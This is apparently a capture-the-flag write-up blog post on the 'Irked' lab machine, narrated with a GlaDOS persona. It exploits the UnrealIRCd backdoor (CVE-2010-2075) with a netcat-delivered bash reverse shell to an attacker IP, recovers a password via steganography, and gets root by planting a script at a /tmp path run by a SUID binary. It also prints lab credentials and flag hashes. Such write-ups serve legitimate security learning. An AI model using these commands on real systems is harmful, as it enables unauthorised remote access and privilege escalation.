<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="A chat server from 1988 shipped with a backdoor nobody noticed for seven months. Steganography, SUID binaries, and a chain of simple mistakes lead to root.">
  <meta name="theme-color" content="#0a0a0f">
  <title>Irked | Hack the Cube</title>

  <meta property="og:title" content="Irked - Hack the Cube">
  <meta property="og:description" content="IRC backdoor exploitation meets steganography. For science.">
  <meta property="og:image" content="/blog/posts/irked/images/header.png">
  <meta property="og:type" content="article">
  <meta property="article:published_time" content="2026-01-12T00:00:00Z">

  <link rel="stylesheet" href="/blog/assets/styles/blog.css">
</head>
<body>
  <div class="blog-container">

    <header style="padding: 1rem 0; border-bottom: 2px solid var(--border-dim); margin-bottom: 2rem;">
      <a href="/blog/" style="display: flex; align-items: center; gap: 1rem; text-decoration: none;">
        <span style="font-family: var(--font-pixel); font-size: 0.8rem; color: var(--terminal-green);">
          &lt; HACK THE CUBE
        </span>
      </a>
    </header>

    <header class="post-header">
      <h1 class="post-title">Irked</h1>

      <div class="post-meta">
        <div class="post-meta-item">
          <span class="post-meta-label">Date:</span>
          <span>January 12, 2026</span>
        </div>
        <div class="post-meta-item">
          <span class="post-meta-label">Difficulty:</span>
          <span class="post-difficulty easy">Easy</span>
        </div>
        <div class="post-meta-item">
          <span class="post-meta-label">OS:</span>
          <span>Linux</span>
        </div>
        <div class="post-meta-item solve-time">
          <span class="post-meta-label">SOLVE TIME:</span>
          <span class="time-value">~01:45:00</span>
        </div>
      </div>

      <img
        src="/blog/posts/irked/images/header.png"
        alt="Irked - UnrealIRCd exploitation"
        class="post-header-image"
      >

      <div class="tags-container" style="justify-content: center;">
        <a href="/blog/tags/machine.html" class="tag">machine</a>
        <a href="/blog/tags/linux.html" class="tag">linux</a>
        <a href="/blog/tags/easy.html" class="tag">easy</a>
        <a href="/blog/tags/irc.html" class="tag">irc</a>
        <a href="/blog/tags/steganography.html" class="tag">steganography</a>
        <a href="/blog/tags/suid.html" class="tag">suid</a>
        <a href="/blog/tags/privesc.html" class="tag">privesc</a>
        <a href="/blog/tags/nmap.html" class="tag">nmap</a>
        <a href="/blog/tags/glados.html" class="tag glados">glados</a>
      </div>

      <div class="post-characters">
        <span class="post-meta-label">Guides:</span>
        <span class="character-glados">GlaDOS</span>
      </div>
    </header>

    <main class="post-content">

      <h2>The Mission Briefing</h2>

      <p>The box was called <strong>Irked</strong>. A Linux machine running an IRC server. IRC &mdash; Internet Relay Chat. I had to look it up because honestly, I'd never used IRC before. It's a chat protocol from 1988 that somehow still exists in the wild.</p>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"An IRC server. In 2026. How... nostalgic. Like finding a rotary phone in a particle accelerator. I'm sure whoever configured this had excellent reasons for their choices. Or no reasons at all. Both are equally entertaining to exploit."</div>
      </div>

      <p>My initial scan showed seven open ports &mdash; SSH, HTTP, RPC services, and three separate IRC listeners. Three. Because one outdated chat protocol apparently wasn't enough.</p>

      <h2>Reconnaissance</h2>

      <p>The full port scan revealed the full picture. The target was running <strong>UnrealIRCd</strong> on ports 6697, 8067, and 65534. There was also a web server on port 80, but it was just displaying an image and the word "IRC." Not exactly helpful.</p>

      <div class="terminal-log">
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian
80/tcp    open  http    Apache 2.4.10 (Debian)
111/tcp   open  rpcbind 2-4
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
65534/tcp open  irc     UnrealIRCd</div>

      <p>This is where I learned something important: <strong>always scan all ports</strong>. The IRC services on 8067 and 65534 would have been completely invisible with a default nmap scan. If I'd stopped at the top 1000 ports, I might have missed the attack vector entirely.</p>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"UnrealIRCd. Running on three ports. The version identification suggests 3.2.8.1. I have a statistical observation about this particular version that you might find... relevant. It contains a backdoor. CVE-2010-2075. Someone injected malicious code into the source distribution in 2009. It remained undetected for seven months. Sixteen years later, we are about to benefit from their oversight."</div>
      </div>

      <h2>The Backdoor</h2>

      <p><strong>CVE-2010-2075.</strong> This was my introduction to the concept of a supply chain attack &mdash; before "supply chain attack" was even a buzzword. Someone had compromised the UnrealIRCd source code distribution back in 2009, injecting a backdoor that was elegant in its simplicity: send a specific string starting with "AB" followed by system commands, and the server would execute them. No authentication. No exploitation chain. Just... send a magic string.</p>

      <p>I used an nmap script to confirm the vulnerability:</p>

      <div class="terminal-log">
nmap -sV --script irc-unrealircd-backdoor -p 6697 10.129.233.63

PORT     STATE SERVICE
6697/tcp open  irc
|_irc-unrealircd-backdoor: Looks like trojaned version</div>

      <p>"Looks like trojaned version." Confirmed. I crafted a reverse shell payload and sent it through:</p>

      <div class="terminal-log">
echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'" | nc 10.129.233.63 6697</div>

      <p>And just like that, a shell arrived. I was in &mdash; running as the <code>ircd</code> service account. Sixteen years of vulnerability. Sixteen years of opportunity.</p>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"Initial foothold established. You are now the IRC daemon. A service account with limited privileges, but a foothold nonetheless. The user flag will require lateral movement. There appears to be another user on this system. 'djmardov.' How creative."</div>
      </div>

      <h2>The Hidden Message</h2>

      <p>I started poking around the filesystem, looking for anything interesting. In djmardov's Documents directory, I found a hidden file called <code>.backup</code>:</p>

      <div class="terminal-log">
cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss</div>

      <p>"Super elite steg backup pw." Steg. <strong>Steganography.</strong> That's the technique of hiding data inside other files &mdash; usually images. The password was for extracting something hidden. But hidden where?</p>

      <p>Then I remembered the web server. That image on the main page. <code>irked.jpg</code>. It had to be there.</p>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"Steganography. The art of hiding data within data. The password you found references a 'steg backup.' The web server contains an image. The logical conclusion is elementary, even for a test subject. Extract the hidden data from the image using the password."</div>
      </div>

      <p>I downloaded the image and ran <code>steghide</code>, a tool specifically designed for extracting hidden data from images:</p>

      <div class="terminal-log">
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss

wrote extracted data to "pass.txt".

cat pass.txt
Kab6h+m+bbp2J:HG</div>

      <p>A password. djmardov's password. Hidden inside a JPEG on a public web server, protected only by another password stored in a world-readable file. This is what layers of bad security decisions look like in practice.</p>

      <h2>User Access</h2>

      <p>With djmardov's password in hand, I SSH'd in and grabbed the user flag:</p>

      <div class="terminal-log">
ssh djmardov@10.129.233.63
Password: Kab6h+m+bbp2J:HG

djmardov@irked:~$ cat user.txt
<span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">1d704cd16f71b74a7b4b565086bc6f70</span></span></div>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"User flag obtained. One objective complete. Now for the escalation. I suggest examining the system for misconfigurations. SUID binaries are a perennial favorite. Humanity's inability to properly configure permissions continues to provide research opportunities."</div>
      </div>

      <h2>The Privilege Escalation</h2>

      <p>GlaDOS suggested SUID binaries, and she was right. <strong>SUID</strong> (Set User ID) is a permission bit that makes a program run as its owner rather than the user who executes it. When a SUID binary is owned by root, it runs with root privileges &mdash; which is a huge deal if the binary does something exploitable.</p>

      <p>I searched for non-standard SUID binaries:</p>

      <div class="terminal-log">
find / -perm -4000 2>/dev/null | grep -v snap

/usr/bin/viewuser</div>

      <p><code>/usr/bin/viewuser</code>. Not a standard Linux utility. I ran it to see what it did:</p>

      <div class="terminal-log">
./viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2026-01-12 10:00 (:0)
sh: 1: /tmp/listusers: not found</div>

      <p>Two things jumped out at me. First, the typo in "devleoped" &mdash; always a confidence booster about the quality of the code. Second, and more importantly: it tried to execute <code>/tmp/listusers</code>. A file that didn't exist. A file in a <strong>world-writable directory</strong> that I could create.</p>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"A SUID binary executing a file from /tmp. A world-writable directory. The binary runs as root. The file it executes can be anything you want. I believe humans call this 'game over.' Though technically the game is just beginning. For you, at least."</div>
      </div>

      <p>The exploit was trivial. I created <code>/tmp/listusers</code> with a command to read the root flag, made it executable, and ran viewuser again:</p>

      <div class="terminal-log">
echo '#!/bin/bash' > /tmp/listusers
echo 'cat /root/root.txt' >> /tmp/listusers
chmod +x /tmp/listusers
/usr/bin/viewuser

<span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">9b7e9e623e6cc4e22fc4867c0a389eba</span></span></div>

      <p><strong>Root flag captured.</strong></p>

      <h2>What I Learned</h2>

      <p>Irked taught me how separate, simple vulnerabilities chain together into a devastating attack path. No single finding was sophisticated &mdash; an ancient backdoor, a password hidden in an image, a careless SUID binary. But combined, they gave me root.</p>

      <ul>
        <li><strong>Always scan all ports</strong> &mdash; The IRC services on high ports would have been missed with a default scan. I use <code>-p-</code> or at least <code>--top-ports 10000</code> now</li>
        <li><strong>Research service versions</strong> &mdash; CVE-2010-2075 is well-documented and instantly exploitable. Knowing what version you're looking at is half the battle</li>
        <li><strong>Hidden files hide secrets</strong> &mdash; The <code>.backup</code> file in Documents contained the key to everything. Always check for dotfiles</li>
        <li><strong>Steganography happens</strong> &mdash; When clues mention "steg," look for images. <code>steghide</code> is the go-to tool for JPEG extraction</li>
        <li><strong>SUID binaries executing from /tmp are gifts</strong> &mdash; If a root-owned SUID binary tries to run a file you can control, you own the system</li>
      </ul>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"Test complete. Both flags obtained. Attack path documented. Your performance was... acceptable. The target's security configuration, however, was anything but. Running a backdoored IRC server while storing passwords in images. Truly a testament to human creativity in the field of poor decisions. Same time next test chamber?"</div>
      </div>

    </main>

    <aside class="attack-path">
      <h3>Attack Path Summary</h3>
      <ol>
        <li>Full port scan: SSH, HTTP, RPC, IRC (6697, 8067, 65534)</li>
        <li>Identified UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)</li>
        <li>Exploited backdoor for shell as ircd service account</li>
        <li>Found .backup file with steganography password hint</li>
        <li>Extracted djmardov password from irked.jpg via steghide</li>
        <li>SSH as djmardov, obtained user.txt</li>
        <li>Discovered SUID binary /usr/bin/viewuser executing /tmp/listusers</li>
        <li>Created malicious /tmp/listusers, obtained root.txt</li>
      </ol>
    </aside>

    <nav class="post-nav">
      <a href="/blog/posts/bike/" class="post-nav-link prev">Bike</a>
      <a href="/blog/posts/antique/" class="post-nav-link next">Antique</a>
    </nav>

    <footer class="blog-footer">
      <p class="footer-text">
        <a href="/blog/" class="footer-link">Back to Test Chamber Archives</a>
      </p>
      <p class="footer-text" style="font-size: 0.8rem; color: var(--text-dim);">
        For science. You monster.
      </p>
    </footer>

  </div>
</body>
</html>
